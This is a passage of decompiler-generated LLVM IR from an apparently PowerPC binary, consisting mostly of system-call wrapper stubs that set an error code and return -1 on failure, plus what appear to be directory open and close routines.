  store i32 %v0_10007d4c, i32* %v2_10007d4c, align 4
  br label %dec_label_pc_10007d54

dec_label_pc_10007d54:                            ; preds = %dec_label_pc_10007d20, %dec_label_pc_10007d48
  %v0_10007d64 = phi i32 [ %v0_10007d38, %dec_label_pc_10007d20 ], [ -1, %dec_label_pc_10007d48 ]
  ret i32 %v0_10007d64

; uselistorder directives
  uselistorder label %dec_label_pc_10007d54, { 1, 0 }
}

define i32 @function_10007d68() local_unnamed_addr {
dec_label_pc_10007d68:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007d80 = call i32 @__asm_mfcr()
  %v1_10007d84 = and i32 %v0_10007d80, 268435456
  %v3_10007d84 = icmp eq i32 %v1_10007d84, 0
  store i32 %v0_10007d80, i32* %r31.global-to-local, align 4
  br i1 %v3_10007d84, label %dec_label_pc_10007d9c, label %dec_label_pc_10007d90

dec_label_pc_10007d90:                            ; preds = %dec_label_pc_10007d68
  %v0_10007d90 = call i32 @function_10008484()
  %v0_10007d94 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007d94 = inttoptr i32 %v0_10007d90 to i32*
  store i32 %v0_10007d94, i32* %v2_10007d94, align 4
  br label %dec_label_pc_10007d9c

dec_label_pc_10007d9c:                            ; preds = %dec_label_pc_10007d68, %dec_label_pc_10007d90
  %v0_10007dac = phi i32 [ %v0_10007d80, %dec_label_pc_10007d68 ], [ -1, %dec_label_pc_10007d90 ]
  ret i32 %v0_10007dac

; uselistorder directives
  uselistorder label %dec_label_pc_10007d9c, { 1, 0 }
}

define i32 @function_10007db0() local_unnamed_addr {
dec_label_pc_10007db0:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007dc8 = call i32 @__asm_mfcr()
  %v1_10007dcc = and i32 %v0_10007dc8, 268435456
  %v3_10007dcc = icmp eq i32 %v1_10007dcc, 0
  store i32 %v0_10007dc8, i32* %r31.global-to-local, align 4
  br i1 %v3_10007dcc, label %dec_label_pc_10007de4, label %dec_label_pc_10007dd8

dec_label_pc_10007dd8:                            ; preds = %dec_label_pc_10007db0
  %v0_10007dd8 = call i32 @function_10008484()
  %v0_10007ddc = load i32, i32* %r31.global-to-local, align 4
  %v2_10007ddc = inttoptr i32 %v0_10007dd8 to i32*
  store i32 %v0_10007ddc, i32* %v2_10007ddc, align 4
  br label %dec_label_pc_10007de4

dec_label_pc_10007de4:                            ; preds = %dec_label_pc_10007db0, %dec_label_pc_10007dd8
  %v0_10007df4 = phi i32 [ %v0_10007dc8, %dec_label_pc_10007db0 ], [ -1, %dec_label_pc_10007dd8 ]
  ret i32 %v0_10007df4

; uselistorder directives
  uselistorder label %dec_label_pc_10007de4, { 1, 0 }
}

define i32 @function_10007df8() local_unnamed_addr {
dec_label_pc_10007df8:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007e10 = call i32 @__asm_mfcr()
  %v1_10007e14 = and i32 %v0_10007e10, 268435456
  %v3_10007e14 = icmp eq i32 %v1_10007e14, 0
  store i32 %v0_10007e10, i32* %r31.global-to-local, align 4
  br i1 %v3_10007e14, label %dec_label_pc_10007e2c, label %dec_label_pc_10007e20

dec_label_pc_10007e20:                            ; preds = %dec_label_pc_10007df8
  %v0_10007e20 = call i32 @function_10008484()
  %v0_10007e24 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007e24 = inttoptr i32 %v0_10007e20 to i32*
  store i32 %v0_10007e24, i32* %v2_10007e24, align 4
  br label %dec_label_pc_10007e2c

dec_label_pc_10007e2c:                            ; preds = %dec_label_pc_10007df8, %dec_label_pc_10007e20
  %v0_10007e3c = phi i32 [ %v0_10007e10, %dec_label_pc_10007df8 ], [ -1, %dec_label_pc_10007e20 ]
  ret i32 %v0_10007e3c

; uselistorder directives
  uselistorder label %dec_label_pc_10007e2c, { 1, 0 }
}

define i32 @function_10007e40() local_unnamed_addr {
dec_label_pc_10007e40:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007e58 = call i32 @__asm_mfcr()
  %v1_10007e5c = and i32 %v0_10007e58, 268435456
  %v3_10007e5c = icmp eq i32 %v1_10007e5c, 0
  store i32 %v0_10007e58, i32* %r31.global-to-local, align 4
  br i1 %v3_10007e5c, label %dec_label_pc_10007e74, label %dec_label_pc_10007e68

dec_label_pc_10007e68:                            ; preds = %dec_label_pc_10007e40
  %v0_10007e68 = call i32 @function_10008484()
  %v0_10007e6c = load i32, i32* %r31.global-to-local, align 4
  %v2_10007e6c = inttoptr i32 %v0_10007e68 to i32*
  store i32 %v0_10007e6c, i32* %v2_10007e6c, align 4
  br label %dec_label_pc_10007e74

dec_label_pc_10007e74:                            ; preds = %dec_label_pc_10007e40, %dec_label_pc_10007e68
  %v0_10007e84 = phi i32 [ %v0_10007e58, %dec_label_pc_10007e40 ], [ -1, %dec_label_pc_10007e68 ]
  ret i32 %v0_10007e84

; uselistorder directives
  uselistorder label %dec_label_pc_10007e74, { 1, 0 }
}

define i32 @function_10007e88(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10007e88:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007ea0 = call i32 @__asm_mfcr()
  %v1_10007ea4 = and i32 %v0_10007ea0, 268435456
  %v3_10007ea4 = icmp eq i32 %v1_10007ea4, 0
  store i32 %v0_10007ea0, i32* %r31.global-to-local, align 4
  br i1 %v3_10007ea4, label %dec_label_pc_10007ebc, label %dec_label_pc_10007eb0

dec_label_pc_10007eb0:                            ; preds = %dec_label_pc_10007e88
  %v0_10007eb0 = call i32 @function_10008484()
  %v0_10007eb4 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007eb4 = inttoptr i32 %v0_10007eb0 to i32*
  store i32 %v0_10007eb4, i32* %v2_10007eb4, align 4
  br label %dec_label_pc_10007ebc

dec_label_pc_10007ebc:                            ; preds = %dec_label_pc_10007e88, %dec_label_pc_10007eb0
  %v0_10007ecc = phi i32 [ %v0_10007ea0, %dec_label_pc_10007e88 ], [ -1, %dec_label_pc_10007eb0 ]
  ret i32 %v0_10007ecc

; uselistorder directives
  uselistorder label %dec_label_pc_10007ebc, { 1, 0 }
}

define i32 @function_10007ed0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10007ed0:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v1_10007ee4 = and i32 %arg2, 64
  %v3_10007ee4 = icmp eq i32 %v1_10007ee4, 0
  br i1 %v3_10007ee4, label %dec_label_pc_10007f10, label %dec_label_pc_10007ef4

dec_label_pc_10007ef4:                            ; preds = %dec_label_pc_10007ed0
  %v2_10007efc = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_10007efc, i32* %stack_var_-32, align 4
  %v0_10007f0c = load i32, i32* @r5, align 4
  br label %dec_label_pc_10007f10

dec_label_pc_10007f10:                            ; preds = %dec_label_pc_10007ed0, %dec_label_pc_10007ef4
  %v0_10007f10 = phi i32 [ 0, %dec_label_pc_10007ed0 ], [ %v0_10007f0c, %dec_label_pc_10007ef4 ]
  store i32 %v0_10007f10, i32* @r5, align 4
  %v0_10007f18 = call i32 @__asm_mfcr()
  %v1_10007f1c = and i32 %v0_10007f18, 268435456
  %v3_10007f1c = icmp eq i32 %v1_10007f1c, 0
  store i32 %v0_10007f18, i32* %r31.global-to-local, align 4
  br i1 %v3_10007f1c, label %dec_label_pc_10007f34, label %dec_label_pc_10007f28

dec_label_pc_10007f28:                            ; preds = %dec_label_pc_10007f10
  %v0_10007f28 = call i32 @function_10008484()
  %v0_10007f2c = load i32, i32* %r31.global-to-local, align 4
  %v2_10007f2c = inttoptr i32 %v0_10007f28 to i32*
  store i32 %v0_10007f2c, i32* %v2_10007f2c, align 4
  br label %dec_label_pc_10007f34

dec_label_pc_10007f34:                            ; preds = %dec_label_pc_10007f10, %dec_label_pc_10007f28
  %v0_10007f44 = phi i32 [ %v0_10007f18, %dec_label_pc_10007f10 ], [ -1, %dec_label_pc_10007f28 ]
  ret i32 %v0_10007f44

; uselistorder directives
  uselistorder label %dec_label_pc_10007f34, { 1, 0 }
  uselistorder label %dec_label_pc_10007f10, { 1, 0 }
}

define i32 @function_10007f48(i32 %arg1) local_unnamed_addr {
dec_label_pc_10007f48:
  store i32 %arg1, i32* @r5, align 4
  %v2_10007f54 = call i32 @function_10007ed0(i32 577, i32 577)
  ret i32 %v2_10007f54
}

define i32 @function_10007f58(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10007f58:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007f70 = call i32 @__asm_mfcr()
  %v1_10007f74 = and i32 %v0_10007f70, 268435456
  %v3_10007f74 = icmp eq i32 %v1_10007f74, 0
  store i32 %v0_10007f70, i32* %r31.global-to-local, align 4
  br i1 %v3_10007f74, label %dec_label_pc_10007f8c, label %dec_label_pc_10007f80

dec_label_pc_10007f80:                            ; preds = %dec_label_pc_10007f58
  %v0_10007f80 = call i32 @function_10008484()
  %v0_10007f84 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007f84 = inttoptr i32 %v0_10007f80 to i32*
  store i32 %v0_10007f84, i32* %v2_10007f84, align 4
  br label %dec_label_pc_10007f8c

dec_label_pc_10007f8c:                            ; preds = %dec_label_pc_10007f58, %dec_label_pc_10007f80
  %v0_10007f9c = phi i32 [ %v0_10007f70, %dec_label_pc_10007f58 ], [ -1, %dec_label_pc_10007f80 ]
  ret i32 %v0_10007f9c

; uselistorder directives
  uselistorder label %dec_label_pc_10007f8c, { 1, 0 }
}

define i32 @function_10007fa0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10007fa0:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007fb8 = call i32 @__asm_mfcr()
  %v1_10007fbc = and i32 %v0_10007fb8, 268435456
  %v3_10007fbc = icmp eq i32 %v1_10007fbc, 0
  store i32 %v0_10007fb8, i32* %r31.global-to-local, align 4
  br i1 %v3_10007fbc, label %dec_label_pc_10007fd4, label %dec_label_pc_10007fc8

dec_label_pc_10007fc8:                            ; preds = %dec_label_pc_10007fa0
  %v0_10007fc8 = call i32 @function_10008484()
  %v0_10007fcc = load i32, i32* %r31.global-to-local, align 4
  %v2_10007fcc = inttoptr i32 %v0_10007fc8 to i32*
  store i32 %v0_10007fcc, i32* %v2_10007fcc, align 4
  br label %dec_label_pc_10007fd4

dec_label_pc_10007fd4:                            ; preds = %dec_label_pc_10007fa0, %dec_label_pc_10007fc8
  %v0_10007fe4 = phi i32 [ %v0_10007fb8, %dec_label_pc_10007fa0 ], [ -1, %dec_label_pc_10007fc8 ]
  ret i32 %v0_10007fe4

; uselistorder directives
  uselistorder label %dec_label_pc_10007fd4, { 1, 0 }
}

define i32 @function_10007fe8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10007fe8:
  %r31.global-to-local = alloca i32, align 4
  %v0_10008000 = call i32 @__asm_mfcr()
  %v1_10008004 = and i32 %v0_10008000, 268435456
  %v3_10008004 = icmp eq i32 %v1_10008004, 0
  store i32 %v0_10008000, i32* %r31.global-to-local, align 4
  br i1 %v3_10008004, label %dec_label_pc_1000801c, label %dec_label_pc_10008010

dec_label_pc_10008010:                            ; preds = %dec_label_pc_10007fe8
  %v0_10008010 = call i32 @function_10008484()
  %v0_10008014 = load i32, i32* %r31.global-to-local, align 4
  %v2_10008014 = inttoptr i32 %v0_10008010 to i32*
  store i32 %v0_10008014, i32* %v2_10008014, align 4
  br label %dec_label_pc_1000801c

dec_label_pc_1000801c:                            ; preds = %dec_label_pc_10007fe8, %dec_label_pc_10008010
  %v0_1000802c = phi i32 [ %v0_10008000, %dec_label_pc_10007fe8 ], [ -1, %dec_label_pc_10008010 ]
  ret i32 %v0_1000802c

; uselistorder directives
  uselistorder label %dec_label_pc_1000801c, { 1, 0 }
}

define i32 @function_10008030(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_10008030:
  %r31.global-to-local = alloca i32, align 4
  %v0_10008048 = call i32 @__asm_mfcr()
  %v1_1000804c = and i32 %v0_10008048, 268435456
  %v3_1000804c = icmp eq i32 %v1_1000804c, 0
  store i32 %v0_10008048, i32* %r31.global-to-local, align 4
  br i1 %v3_1000804c, label %dec_label_pc_10008064, label %dec_label_pc_10008058

dec_label_pc_10008058:                            ; preds = %dec_label_pc_10008030
  %v0_10008058 = call i32 @function_10008484()
  %v0_1000805c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000805c = inttoptr i32 %v0_10008058 to i32*
  store i32 %v0_1000805c, i32* %v2_1000805c, align 4
  br label %dec_label_pc_10008064

dec_label_pc_10008064:                            ; preds = %dec_label_pc_10008030, %dec_label_pc_10008058
  %v0_10008074 = phi i32 [ %v0_10008048, %dec_label_pc_10008030 ], [ -1, %dec_label_pc_10008058 ]
  ret i32 %v0_10008074

; uselistorder directives
  uselistorder label %dec_label_pc_10008064, { 1, 0 }
}

define i32 @function_10008078(i32 %arg1) local_unnamed_addr {
dec_label_pc_10008078:
  %r31.global-to-local = alloca i32, align 4
  %v0_10008090 = call i32 @__asm_mfcr()
  %v1_10008094 = and i32 %v0_10008090, 268435456
  %v3_10008094 = icmp eq i32 %v1_10008094, 0
  store i32 %v0_10008090, i32* %r31.global-to-local, align 4
  br i1 %v3_10008094, label %dec_label_pc_100080ac, label %dec_label_pc_100080a0

dec_label_pc_100080a0:                            ; preds = %dec_label_pc_10008078
  %v0_100080a0 = call i32 @function_10008484()
  %v0_100080a4 = load i32, i32* %r31.global-to-local, align 4
  %v2_100080a4 = inttoptr i32 %v0_100080a0 to i32*
  store i32 %v0_100080a4, i32* %v2_100080a4, align 4
  br label %dec_label_pc_100080ac

dec_label_pc_100080ac:                            ; preds = %dec_label_pc_10008078, %dec_label_pc_100080a0
  %v0_100080bc = phi i32 [ %v0_10008090, %dec_label_pc_10008078 ], [ -1, %dec_label_pc_100080a0 ]
  ret i32 %v0_100080bc

; uselistorder directives
  uselistorder label %dec_label_pc_100080ac, { 1, 0 }
}

define i32 @function_100080c0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100080c0:
  %r31.global-to-local = alloca i32, align 4
  %v3_100080c0 = icmp eq i32 %arg2, 0
  br i1 %v3_100080c0, label %dec_label_pc_10008100, label %dec_label_pc_100080e8

dec_label_pc_100080e8:                            ; preds = %dec_label_pc_100080c0
  store i32 -1, i32* %r31.global-to-local, align 4
  %tmp5 = icmp ult i32 %arg1, 3
  br i1 %tmp5, label %dec_label_pc_10008100, label %dec_label_pc_100080f0

dec_label_pc_100080f0:                            ; preds = %dec_label_pc_100080e8
  %v0_100080f0 = call i32 @function_10008484()
  %v2_100080f8 = inttoptr i32 %v0_100080f0 to i32*
  store i32 22, i32* %v2_100080f8, align 4
  %v0_10008124.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10008120

dec_label_pc_10008100:                            ; preds = %dec_label_pc_100080e8, %dec_label_pc_100080c0
  %v0_10008104 = call i32 @__asm_mfcr()
  %v1_10008108 = and i32 %v0_10008104, 268435456
  %v3_10008108 = icmp eq i32 %v1_10008108, 0
  store i32 %v0_10008104, i32* %r31.global-to-local, align 4
  br i1 %v3_10008108, label %dec_label_pc_10008120, label %dec_label_pc_10008114

dec_label_pc_10008114:                            ; preds = %dec_label_pc_10008100
  %v0_10008114 = call i32 @function_10008484()
  %v0_10008118 = load i32, i32* %r31.global-to-local, align 4
  %v2_10008118 = inttoptr i32 %v0_10008114 to i32*
  store i32 %v0_10008118, i32* %v2_10008118, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10008120

dec_label_pc_10008120:                            ; preds = %dec_label_pc_10008100, %dec_label_pc_100080f0, %dec_label_pc_10008114
  %v0_10008124 = phi i32 [ %v0_10008104, %dec_label_pc_10008100 ], [ %v0_10008124.pre, %dec_label_pc_100080f0 ], [ -1, %dec_label_pc_10008114 ]
  ret i32 %v0_10008124

; uselistorder directives
  uselistorder label %dec_label_pc_10008120, { 2, 0, 1 }
}

define i32 @function_10008138() local_unnamed_addr {
dec_label_pc_10008138:
  %r31.global-to-local = alloca i32, align 4
  %v0_10008150 = call i32 @__asm_mfcr()
  %v1_10008154 = and i32 %v0_10008150, 268435456
  %v3_10008154 = icmp eq i32 %v1_10008154, 0
  store i32 %v0_10008150, i32* %r31.global-to-local, align 4
  br i1 %v3_10008154, label %dec_label_pc_1000816c, label %dec_label_pc_10008160

dec_label_pc_10008160:                            ; preds = %dec_label_pc_10008138
  %v0_10008160 = call i32 @function_10008484()
  %v0_10008164 = load i32, i32* %r31.global-to-local, align 4
  %v2_10008164 = inttoptr i32 %v0_10008160 to i32*
  store i32 %v0_10008164, i32* %v2_10008164, align 4
  br label %dec_label_pc_1000816c

dec_label_pc_1000816c:                            ; preds = %dec_label_pc_10008138, %dec_label_pc_10008160
  %v0_1000817c = phi i32 [ %v0_10008150, %dec_label_pc_10008138 ], [ -1, %dec_label_pc_10008160 ]
  ret i32 %v0_1000817c

; uselistorder directives
  uselistorder label %dec_label_pc_1000816c, { 1, 0 }
}

define i32 @function_10008180(i32 %arg1) local_unnamed_addr {
dec_label_pc_10008180:
  %r31.global-to-local = alloca i32, align 4
  %v0_10008198 = call i32 @__asm_mfcr()
  %v1_1000819c = and i32 %v0_10008198, 268435456
  %v3_1000819c = icmp eq i32 %v1_1000819c, 0
  store i32 %v0_10008198, i32* %r31.global-to-local, align 4
  br i1 %v3_1000819c, label %dec_label_pc_100081b4, label %dec_label_pc_100081a8

dec_label_pc_100081a8:                            ; preds = %dec_label_pc_10008180
  %v0_100081a8 = call i32 @function_10008484()
  %v0_100081ac = load i32, i32* %r31.global-to-local, align 4
  %v2_100081ac = inttoptr i32 %v0_100081a8 to i32*
  store i32 %v0_100081ac, i32* %v2_100081ac, align 4
  br label %dec_label_pc_100081b4

dec_label_pc_100081b4:                            ; preds = %dec_label_pc_10008180, %dec_label_pc_100081a8
  %v0_100081c4 = phi i32 [ %v0_10008198, %dec_label_pc_10008180 ], [ -1, %dec_label_pc_100081a8 ]
  ret i32 %v0_100081c4

; uselistorder directives
  uselistorder label %dec_label_pc_100081b4, { 1, 0 }
}

define i32 @function_100081c8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100081c8:
  %r31.global-to-local = alloca i32, align 4
  %v0_100081e0 = call i32 @__asm_mfcr()
  %v1_100081e4 = and i32 %v0_100081e0, 268435456
  %v3_100081e4 = icmp eq i32 %v1_100081e4, 0
  store i32 %v0_100081e0, i32* %r31.global-to-local, align 4
  br i1 %v3_100081e4, label %dec_label_pc_100081fc, label %dec_label_pc_100081f0

dec_label_pc_100081f0:                            ; preds = %dec_label_pc_100081c8
  %v0_100081f0 = call i32 @function_10008484()
  %v0_100081f4 = load i32, i32* %r31.global-to-local, align 4
  %v2_100081f4 = inttoptr i32 %v0_100081f0 to i32*
  store i32 %v0_100081f4, i32* %v2_100081f4, align 4
  br label %dec_label_pc_100081fc

dec_label_pc_100081fc:                            ; preds = %dec_label_pc_100081c8, %dec_label_pc_100081f0
  %v0_1000820c = phi i32 [ %v0_100081e0, %dec_label_pc_100081c8 ], [ -1, %dec_label_pc_100081f0 ]
  ret i32 %v0_1000820c

; uselistorder directives
  uselistorder label %dec_label_pc_100081fc, { 1, 0 }
}

define i32 @function_10008210(i32* %arg1) local_unnamed_addr {
dec_label_pc_10008210:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_1000822c = ptrtoint i32* %stack_var_-40 to i32
  %v2_10008234 = load i32, i32* %arg1, align 4
  store i32 %v2_1000822c, i32* @r3, align 4
  %v3_10008240 = icmp eq i32 %v2_10008234, -1
  br i1 %v3_10008240, label %dec_label_pc_10008248, label %dec_label_pc_1000825c

dec_label_pc_10008248:                            ; preds = %dec_label_pc_10008210
  %v0_10008248 = call i32 @function_10008484()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_10008254 = inttoptr i32 %v0_10008248 to i32*
  store i32 9, i32* %v2_10008254, align 4
  %v0_100082a0.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000829c

dec_label_pc_1000825c:                            ; preds = %dec_label_pc_10008210
  %v3_1000825c = call i32 @function_100098cc(i32 %v2_1000822c, i32 ptrtoint ([3 x i8]* @global_var_100098c4.361 to i32))
  %v0_10008264 = call i32 @function_100098c4()
  %v0_1000826c = load i32, i32* @r31, align 4
  %v1_1000826c = inttoptr i32 %v0_1000826c to i32*
  %v2_1000826c = load i32, i32* %v1_1000826c, align 4
  store i32 %v2_1000826c, i32* @r29, align 4
  store i32 -1, i32* %v1_1000826c, align 4
  store i32 %v2_1000822c, i32* @r3, align 4
  %v2_1000827c = call i32 @function_100098cc(i32 %v2_1000822c, i32 1)
  %v0_10008280 = load i32, i32* @r31, align 4
  %v1_10008280 = add i32 %v0_10008280, 12
  %v2_10008280 = inttoptr i32 %v1_10008280 to i32*
  %v3_10008280 = load i32, i32* %v2_10008280, align 4
  store i32 %v3_10008280, i32* @r3, align 4
  store i32 268468872, i32* @lr, align 4
  %v0_10008284 = call i32 @function_10008f30()
  %v0_10008288 = load i32, i32* @r31, align 4
  store i32 %v0_10008288, i32* @r3, align 4
  store i32 268468880, i32* @lr, align 4
  %v0_1000828c = call i32 @function_10008f30()
  store i32 268468888, i32* @lr, align 4
  %v0_10008294 = call i32 @function_10007d68()
  store i32 %v0_10008294, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000829c

dec_label_pc_1000829c:                            ; preds = %dec_label_pc_10008248, %dec_label_pc_1000825c
  %v0_100082a0 = phi i32 [ %v0_100082a0.pre, %dec_label_pc_10008248 ], [ %v0_10008294, %dec_label_pc_1000825c ]
  ret i32 %v0_100082a0

; uselistorder directives
  uselistorder i32 %v2_1000822c, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1000829c, { 1, 0 }
}

define i32 @function_100082b4(i32 %arg1) local_unnamed_addr {
dec_label_pc_100082b4:
  %r0.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  %v0_100082b4 = load i32, i32* @lr, align 4
  store i32 %v0_100082b4, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  store i32 268468948, i32* @lr, align 4
  %v2_100082d0 = call i32 @function_10007ed0(i32 18432, i32 18432)
  %v1_100082d4 = icmp slt i32 %v2_100082d0, 0
  br i1 %v1_100082d4, label %dec_label_pc_100083ac, label %dec_label_pc_100082dc

dec_label_pc_100082dc:                            ; preds = %dec_label_pc_100082b4
  %v2_100082dc = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_100082dc, i32* @r4, align 4
  store i32 268468964, i32* @lr, align 4
  %v1_100082e0 = call i32 @function_10009ca0(i32 %v2_100082dc)
  %v1_100082e4 = icmp slt i32 %v1_100082e0, 0
  br i1 %v1_100082e4, label %dec_label_pc_10008308, label %dec_label_pc_100082ec

dec_label_pc_100082ec:                            ; preds = %dec_label_pc_100082dc
  %v0_100082ec = load i32, i32* @r29, align 4
  store i32 2, i32* @r4, align 4
  store i32 268468992, i32* @lr, align 4
  %v2_100082fc = call i32 @function_10007c38(i32 %v0_100082ec)
  %tmp5 = icmp sgt i32 %v2_100082fc, -1
  br i1 %tmp5, label %dec_label_pc_10008328, label %dec_label_pc_10008308

dec_label_pc_10008308:                            ; preds = %dec_label_pc_100082ec, %dec_label_pc_100082dc
  %v0_10008308 = call i32 @function_10008484()
  store i32 0, i32* @r31, align 4
  store i32 %v0_10008308, i32* @r28, align 4
  %v1_10008318 = inttoptr i32 %v0_10008308 to i32*
  %v2_10008318 = load i32, i32* %v1_10008318, align 4
  store i32 268469024, i32* @lr, align 4
  %v0_1000831c = call i32 @function_10007d68()
  %v1_10008320 = load i32, i32* @r28, align 4
  %v2_10008320 = inttoptr i32 %v1_10008320 to i32*
  store i32 %v2_10008318, i32* %v2_10008320, align 4
  br label %dec_label_pc_100083ac

dec_label_pc_10008328:                            ; preds = %dec_label_pc_100082ec
  store i32 48, i32* @r3, align 4
  store i32 268469040, i32* @lr, align 4
  %v0_1000832c = call i32 @function_10008d68()
  store i32 %v0_1000832c, i32* %r31.global-to-local, align 4
  %v3_10008330 = icmp eq i32 %v0_1000832c, 0
  br i1 %v3_10008330, label %dec_label_pc_10008384, label %dec_label_pc_10008338

dec_label_pc_10008338:                            ; preds = %dec_label_pc_10008328
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1000833c = load i32, i32* @r29, align 4
  %v2_1000833c = inttoptr i32 %v0_1000832c to i32*
  store i32 %v0_1000833c, i32* %v2_1000833c, align 4
  %v0_10008340 = load i32, i32* %r0.global-to-local, align 4
  %v1_10008340 = load i32, i32* %r31.global-to-local, align 4
  %v2_10008340 = add i32 %v1_10008340, 4
  %v3_10008340 = inttoptr i32 %v2_10008340 to i32*
  store i32 %v0_10008340, i32* %v3_10008340, align 4
  %v0_10008344 = load i32, i32* %r0.global-to-local, align 4
  %v1_10008344 = load i32, i32* %r31.global-to-local, align 4
  %v2_10008344 = add i32 %v1_10008344, 16
  %v3_10008344 = inttoptr i32 %v2_10008344 to i32*
  store i32 %v0_10008344, i32* %v3_10008344, align 4
  %v0_10008348 = load i32, i32* %r0.global-to-local, align 4
  %v1_10008348 = load i32, i32* %r31.global-to-local, align 4
  %v2_10008348 = add i32 %v1_10008348, 8
  %v3_10008348 = inttoptr i32 %v2_10008348 to i32*
  store i32 %v0_10008348, i32* %v3_10008348, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_10008350 = icmp ugt i32 %tmp, 511
  %v1_10008354 = load i32, i32* %r31.global-to-local, align 4
  %v2_10008354 = add i32 %v1_10008354, 20
  %v3_10008354 = inttoptr i32 %v2_10008354 to i32*
  store i32 %tmp, i32* %v3_10008354, align 4
  br i1 %v2_10008350, label %dec_label_pc_10008364, label %dec_label_pc_1000835c

dec_label_pc_1000835c:                            ; preds = %dec_label_pc_10008338
  store i32 512, i32* %r0.global-to-local, align 4
  %v1_10008360 = load i32, i32* %r31.global-to-local, align 4
  %v2_10008360 = add i32 %v1_10008360, 20
  %v3_10008360 = inttoptr i32 %v2_10008360 to i32*
  store i32 512, i32* %v3_10008360, align 4
  br label %dec_label_pc_10008364

dec_label_pc_10008364:                            ; preds = %dec_label_pc_10008338, %dec_label_pc_1000835c
  %v0_10008364 = load i32, i32* %r31.global-to-local, align 4
  %v1_10008364 = add i32 %v0_10008364, 20
  %v2_10008364 = inttoptr i32 %v1_10008364 to i32*
  %v3_10008364 = load i32, i32* %v2_10008364, align 4
  store i32 268469104, i32* @lr, align 4
  %v2_1000836c = call i32 @function_10008ec0(i32 1, i32 %v3_10008364)
  %v3_10008370 = icmp eq i32 %v2_1000836c, 0
  %v1_10008374 = load i32, i32* @r31, align 4
  %v2_10008374 = add i32 %v1_10008374, 12
  %v3_10008374 = inttoptr i32 %v2_10008374 to i32*
  store i32 %v2_1000836c, i32* %v3_10008374, align 4
  br i1 %v3_10008370, label %dec_label_pc_1000837c, label %dec_label_pc_100083a0

dec_label_pc_1000837c:                            ; preds = %dec_label_pc_10008364
  %v0_1000837c = load i32, i32* @r31, align 4
  store i32 %v0_1000837c, i32* @r3, align 4
  store i32 268469124, i32* @lr, align 4
  %v0_10008380 = call i32 @function_10008f30()
  br label %dec_label_pc_10008384

dec_label_pc_10008384:                            ; preds = %dec_label_pc_10008328, %dec_label_pc_1000837c
  store i32 0, i32* @r31, align 4
  store i32 ptrtoint (i32* @global_var_10008390.364 to i32), i32* @lr, align 4
  %v0_1000838c = call i32 @function_10007d68()
  %v0_10008390 = call i32 @function_10008484()
  store i32 12, i32* %r0.global-to-local, align 4
  %v2_10008398 = inttoptr i32 %v0_10008390 to i32*
  store i32 12, i32* %v2_10008398, align 4
  br label %dec_label_pc_100083ac

dec_label_pc_100083a0:                            ; preds = %dec_label_pc_10008364
  %v0_100083a8 = call i32 @function_100098c4()
  br label %dec_label_pc_100083ac

dec_label_pc_100083ac:                            ; preds = %dec_label_pc_100082b4, %dec_label_pc_10008384, %dec_label_pc_10008308, %dec_label_pc_100083a0
  store i32 %v0_100082b4, i32* %r0.global-to-local, align 4
  %v0_100083b0 = load i32, i32* @r31, align 4
  ret i32 %v0_100083b0

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8 }
  uselistorder i32 (i32, i32)* @function_10008ec0, { 28, 29, 27, 26, 25, 24, 23, 22, 0, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 512, { 5, 7, 6, 0, 1, 2, 3, 4 }
  uselistorder i32 ()* @function_10007d68, { 19, 18, 17, 33, 6, 25, 32, 31, 30, 29, 28, 27, 26, 7, 24, 23, 22, 21, 20, 16, 15, 8, 14, 13, 12, 11, 10, 9, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 18432, { 1, 0 }
  uselistorder label %dec_label_pc_100083ac, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10008384, { 1, 0 }
  uselistorder label %dec_label_pc_10008364, { 1, 0 }
}

define i32 @function_100083c4(i32* %arg1) local_unnamed_addr {
dec_label_pc_100083c4:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
